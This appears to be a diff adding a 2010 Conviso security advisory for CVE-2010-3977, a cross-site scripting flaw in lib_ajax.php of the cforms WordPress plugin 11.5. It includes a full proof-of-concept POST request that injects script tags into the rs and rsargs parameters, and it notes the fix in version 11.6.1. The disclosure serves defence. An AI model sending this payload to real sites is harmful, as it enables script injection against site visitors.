@@ -1,0 +1,75 @@
+[CONVISO-10-002] - cform WordPress Plugin V 11.5 Cross Site Scripting Vulnerability
+
+1. Advisory Information
+    Conviso Advisory ID: CONVISO-10-002
+    CVE ID: CVE-2010-3977
+    CVSS v2: 5.7
+    Date: 2010-07-24
+
+2. Affected Components
+    File lib_ajax.php on version 11.5.
+
+3. Description
+    Created and distributed by Delicious Days (http://www.deliciousdays.com/), cforms is a rich form
+    plugin for WordPress, offering deployment of multiple Ajax driven contact forms throughout
+    user's blog or even on the same page. An issue on version 11.5 allows the exploit of a Cross
+    Site Scripting (XSS) vulnerability and the consequent capability of client-side attacks for data
+    leaking and malware propagation.
+
+4. Details
+    The file lib_ajax.php on version 11.5 creates a data array with all values inserted on the
+    form's fields on a POST requisition. As there is no data validation of the rs and rsargs
+    parameters, it is possible to inject malformed data by Javascript.
+
+    Request:
+
+    http://www.siteexample.com/wp-content/plugins/cforms/lib_ajax.php
+
+    POST /wp-content/plugins/cforms/lib_ajax.php HTTP/1.1
+    Host: www.siteexample.com
+    User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.10) Gecko/20100914
+    Firefox/3.6.10
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-us,en;q=0.5
+    Accept-Encoding: gzip,deflate
+    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+    Keep-Alive: 115
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Content-Length: 219
+    Cookie: wp-settings-1=m0%3Do%26m1%3Do%26m2%3Do%26m3%3Do%26m4%3Do%26m5%3Do%26m6%3
+    Do%26m7%3Do%26m8%3Do%26urlbutton%3Dnone%26editor%3Dtinymce%26imgsize%3
+    Dfull%26align%3Dcenter%26hidetb%3D1%26m9%3Dc%26m10%3Do%26uploader%3D1%26m11%3Do;
+    wp-settings-time-1=1285758765; comment_author_93f41ba0b16f34676f802058e82388f6=teste;
+    comment_author_email_93f41ba0b16f34676f802058e82388f6=welias%40conviso.com.br
+    Pragma: no-cache
+    Cache-Control: no-cache
+
+    rs=<script>alert(1)</script>&rst=&rsrnd=1287506634854&rsargs[]=1$#$<script>alert(1)</script>
+    $#$welias@conviso.com.br$#$https://www.conviso.com.br$#$<script>alert(1)</script>
+
+5. Solution
+    Update to version 11.6.1.
+
+6. Credits
+    Wagner Elias <welias@conviso.com.br>
+
+7. Report Timeline
+
+8. References
+
+9. About Conviso
+    Conviso is a consulting company specialized on application security. Our values are based on the
+    allocation of the adequate competencies on the field, a clear and direct speech with the market,
+    collaboration and partnership with our customers and business partners and constant investments
+    on methodology and research improvement. For more information about our company and services
+    provided, please check our website at www.conviso.com.br.
+
+10. Copyright and Disclaimer
+    The information in this advisory is Copyright 2010 Conviso Application Security S/A and provided
+    so that the society can understand the risk they may be facing by running affected software,
+    hardware or other components used on their systems. In case you wish to copy information from
+    this advisory, you must either copy all of it or refer to this document (including our URL). No
+    guarantee is provided for the accuracy of this information, or damage you may cause your systems
+    in testing.
+
